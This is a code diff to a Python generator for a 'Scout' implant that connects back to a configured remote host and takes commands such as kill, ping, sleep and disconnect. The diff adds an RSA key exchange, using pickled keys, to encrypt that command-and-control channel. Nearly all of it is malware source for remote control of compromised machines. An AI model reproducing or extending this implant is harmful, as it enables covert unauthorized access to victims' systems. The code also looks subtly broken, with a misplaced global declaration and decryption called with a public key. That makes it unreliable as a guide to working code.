@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 import library.modules.safe_open as safe_open
 
@@ -14,6 +13,8 @@ def main(option):
         filepath = config.scout_values['Path'][0]
         config.import_statements.append('import socket')
         config.import_statements.append('from os import _exit')
+        config.import_statements.append('import rsa')
+        config.import_statements.append('import pickle')
         config.import_statements.append('from time import sleep')
         with safe_open.main(filepath, 'w') as f:
             if ',' in host:
@@ -42,6 +43,13 @@ while True:
                 s.connect((i,variable_port))
                 s.sendall('variable_key')
                 connected = True
+                data0 = recv_all(s)
+                s.settimeout(5)
+                if data0 == 'response':
+                    s.sendall('key:'+ pickle.dumps(pubkey))
+                    data = recv_all(s)
+                    public_key = pickle.loads(data)
+                    global public_key
                 break
             except (socket.timeout,socket.error):
                 continue
@@ -50,22 +58,23 @@ while True:
     while True:
         try:
             data = recv_all(s)
+            data = rsa.decrypt(data, public_key).decode('utf8')
             command = data.split(' ',1)[0]
             if command == 'kill':
-                s.sendall('[*]Scout is killing itself...')
+                sendall(s, '[*]Scout is killing itself...', privkey)
                 _exit(1)
             elif command in ('help','?'):
-                s.sendall(help_menu)
+                sendall(s, help_menu, privkey)
             elif command == 'ping':
-                s.sendall('[+]Scout is alive')
+                sendall(s, '[+]Scout is alive', privkey)
             elif command == 'sleep':
                 length = int(data.split(' ',1)[1])
-                s.sendall('[*]Scout is sleeping...')
+                sendall(s, '[*]Scout is sleeping...', privkey)
                 for i in range(length):
                     sleep(1)
                 break
             elif command == 'disconnect':
-                s.sendall('[*]Scout is disconnecting itself...')
+                sendall(s, '[*]Scout is disconnecting itself...', privkey)
                 sleep(3)
                 break#Statements#
             else:
@@ -101,28 +110,36 @@ while True:
             s.settimeout(variable_timeout)
             s.connect(('variable_host',variable_port))
             s.sendall('variable_key')
+            data0 = recv_all(s)
+            s.settimeout(5)
+            if data0 == 'response':
+                s.sendall('key:'+ pickle.dumps(pubkey))
+                data = recv_all(s)
+                public_key = pickle.loads(data)
+                global public_key
             break
         except (socket.timeout,socket.error):
             continue
     while True:
         try:
             data = recv_all(s)
+            data = rsa.decrypt(data, public_key).decode('utf8')
             command = data.split(' ',1)[0]
             if command == 'kill':
-                s.sendall('[*]Scout is killing itself...')
+                sendall(s, '[*]Scout is killing itself...', privkey)
                 _exit(1)
             elif command in ('help','?'):
-                s.sendall(help_menu)
+                sendall(s, help_menu, privkey)
             elif command == 'ping':
-                s.sendall('[+]Scout is alive')
+                sendall(s, '[+]Scout is alive', privkey)
             elif command == 'sleep':
                 length = int(data.split(' ',1)[1])
-                s.sendall('[*]Scout is sleeping...')
+                sendall(s, '[*]Scout is sleeping...', privkey)
                 for i in range(length):
                     sleep(1)
                 break
             elif command == 'disconnect':
-                s.sendall('[*]Scout is disconnecting itself...')
+                sendall(s, '[*]Scout is disconnecting itself...', privkey)
                 sleep(3)
                 break#Statements#
             else:
